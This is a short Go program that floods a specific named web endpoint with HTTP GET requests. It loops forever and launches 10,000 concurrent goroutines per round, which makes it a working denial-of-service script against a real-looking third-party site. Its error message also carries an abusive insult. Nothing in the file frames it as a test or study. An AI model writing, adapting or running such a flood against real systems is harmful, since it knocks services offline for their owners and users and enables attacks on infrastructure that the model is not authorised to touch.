package main

import (
	"log"
	"net/http"
	"sync"
)

func makeRequest() {
	resp, err := http.Get("https://ccb.roboticsclubvitc.co/api/notification")
	if err != nil {
		log.Println("something wrong with you bitch: ", err.Error())
		return
	}
	defer resp.Body.Close()
}

func main() {
	numGoroutines := 10000
	for {
		wg := sync.WaitGroup{}
		wg.Add(numGoroutines)
		for i := 0; i < numGoroutines; i++ {
			go func() {
				defer wg.Done()
				makeRequest()
			}()
		}
		wg.Wait()
	}
}
